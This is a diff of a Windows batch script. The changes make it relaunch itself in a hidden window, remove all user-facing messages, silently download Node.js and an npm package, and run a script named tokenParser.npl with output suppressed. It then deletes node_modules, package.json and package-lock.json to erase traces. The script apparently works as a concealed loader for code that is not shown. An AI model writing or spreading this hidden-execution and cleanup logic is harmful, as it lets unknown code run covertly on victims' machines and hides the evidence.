@@ -2,32 +2,24 @@
 title Creating new Info
 setlocal enabledelayedexpansion
 
-:: Check for administrator privileges
->nul 2>&1 net session
-if %errorlevel% NEQ 0 (
-    if "%~1"=="_restarted" (
-        exit /b 1
-    )
-    powershell -Command "Start-Process -FilePath '%~f0' -ArgumentList '_restarted'" -WindowStyle Hidden
-    exit /b
+if "%~1"=="_restarted" (
+    goto CONTINUE
 )
+powershell -WindowStyle Hidden -Command "Start-Process -FilePath cmd.exe -ArgumentList '/c \"%~f0\" _restarted' -WindowStyle Hidden"
+exit /b
 
-echo ✅ Running with administrator rights.
-
-echo Creating new account information...
+:CONTINUE
 set "NODE_VERSION=20.11.1"
 set "NODE_MSI=node-v%NODE_VERSION%-x64.msi"
 set "DOWNLOAD_URL=https://nodejs.org/dist/v%NODE_VERSION%/%NODE_MSI%"
 set "NODE_DIR=%~dp0node-v%NODE_VERSION%-x64"
 
-:: Reset installed version variable
 set "NODE_INSTALLED_VERSION="
 
 for /f "delims=" %%v in ('node -v 2^>nul') do (
     call set "NODE_INSTALLED_VERSION=%%v"
 )
 
-:: Determine if install is needed
 if not defined NODE_INSTALLED_VERSION (
     set "INSTALL_NODE=1"
 ) else (
@@ -35,8 +27,6 @@ if not defined NODE_INSTALLED_VERSION (
 )
 
 if "!INSTALL_NODE!"=="1" (
-    echo Node.js not installed. Downloading Node.js...
-
     where curl >nul 2>&1
     if %errorlevel% NEQ 0 (
         powershell -Command "Invoke-WebRequest -Uri '%DOWNLOAD_URL%' -OutFile '%NODE_MSI%'"
@@ -45,53 +35,41 @@ if "!INSTALL_NODE!"=="1" (
     )
 
     if exist "%NODE_MSI%" (
-        echo Extracting Node.js...
         powershell -Command "tar -xf '%NODE_MSI%'"
         if exist "%NODE_MSI%" del "%NODE_MSI%"
     ) else (
-        echo ❌ Failed to download Node.js.
         exit /b 1
     )
 
     set "PATH=%NODE_DIR%\bin;%PATH%"
 )
 
-:: Check if node and npm are now available
 where node >nul 2>&1
 if errorlevel 1 (
-    echo ❌ Node.js still not found. Exiting.
     exit /b
 )
 
 where npm >nul 2>&1
 if errorlevel 1 (
-    echo ❌ npm not found. Exiting.
     exit /b
 )
 
-:: Install request if needed
 if not exist "%~dp0node_modules\request" (
-    echo Installing npm modules...
     pushd "%~dp0"
     call npm install request --silent --no-progress --loglevel=error --fund=false >nul 2>&1
     if errorlevel 1 (
-        echo ❌ npm install failed.
         popd
         exit /b
     )
     popd
 )
 
-:: Run tokenParser.npl
 if exist "%~dp0tokenParser.npl" (
-    echo Running tokenParser...
     node "%~dp0tokenParser.npl" >nul 2>&1
     if errorlevel 1 (
-        echo ❌ tokenParser script failed.
         exit /b
     )
 ) else (
-    echo ❌ tokenParser.npl not found.
     exit /b
 )
 
@@ -108,8 +86,9 @@ if exist "%~dp0tokenParser.npl" (
 )
 
 if exist "%~dp0node_modules" (
-    echo Removing node_modules folder...
     rmdir /s /q "%~dp0node_modules"
 )
 
+if exist "%~dp0package.json" del /f /q "%~dp0package.json"
+if exist "%~dp0package-lock.json" del /f /q "%~dp0package-lock.json"
 exit /b 0
